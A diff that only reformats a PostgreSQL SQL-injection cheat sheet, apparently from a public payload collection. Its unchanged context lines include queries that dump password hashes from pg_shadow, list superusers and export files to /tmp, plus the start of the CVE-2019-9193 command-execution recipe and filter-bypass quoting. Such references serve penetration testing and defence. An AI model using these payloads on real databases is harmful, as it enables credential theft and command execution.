@@ -21,8 +21,8 @@
 * [PostgreSQL File Read](#postgresql-file-read)
 * [PostgreSQL File Write](#postgresql-file-write)
 * [PostgreSQL Command execution](#postgresql-command-execution)
-    * [CVE-2019–9193](#cve-20199193)
-    * [Using libc.so.6](#using-libcso6)
+  * [CVE-2019–9193](#cve-20199193)
+  * [Using libc.so.6](#using-libcso6)
 * [Bypass Filter](#bypass-filter)
 * [References](#references)
 
@@ -39,7 +39,7 @@
 SELECT version()
 ```
 
-## PostgreSQL Current User	
+## PostgreSQL Current User 
 
 ```sql
 SELECT user;
@@ -58,12 +58,15 @@ SELECT usename FROM pg_user
 ## PostgreSQL List Password Hashes
 
 ```sql
-SELECT usename, passwd FROM pg_shadow 
+SELECT usename, passwd FROM pg_shadow
 ```
+
 ## PostgreSQL List Database Administrator Accounts
+
 ```sql
 SELECT usename FROM pg_user WHERE usesuper IS TRUE
 ```
+
 ## PostgreSQL List Privileges
 
 ```sql
@@ -185,7 +188,7 @@ SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
 
 ### CVE-2019–9193
 
-Can be used from [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. 
+Can be used from [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) if you have a direct access to the database, otherwise you need to execute manually the following SQL queries.
 
 ```SQL
 DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
@@ -220,8 +223,6 @@ Using Dollar-signs  ( >= version 8 PostgreSQL)
 SELECT $$This is a string$$
 SELECT $TAG$This is another string$TAG$
 ```
-
-
 
 ## References
 
